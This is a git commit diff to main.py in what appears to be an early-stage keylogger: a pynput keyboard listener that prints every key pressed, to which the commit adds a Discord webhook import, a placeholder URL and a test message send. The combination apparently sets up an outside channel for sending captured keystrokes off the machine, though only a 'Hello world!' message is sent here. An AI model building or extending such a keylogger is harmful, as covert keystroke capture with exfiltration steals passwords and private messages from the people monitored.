3c8c0b0ef63513050badc07bea12f18523dad3ec
mategol <44233157+mategol@users.noreply.github.com>
2022-06-23 12:06:42 +0200

    Set up webhook to send messages on channel

--- main.py
+++ main.py
@@ -1,5 +1,10 @@
 import pynput
 from pynput.keyboard import Key, Listener
+from discord_webhook import DiscordWebhook
+
+webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)
+
+DiscordWebhook(url=webhook_url, content='Hello world!').execute()     # Send message using Webhook
 
 def on_press(key):     # Executes on each key pressed
     print(key)
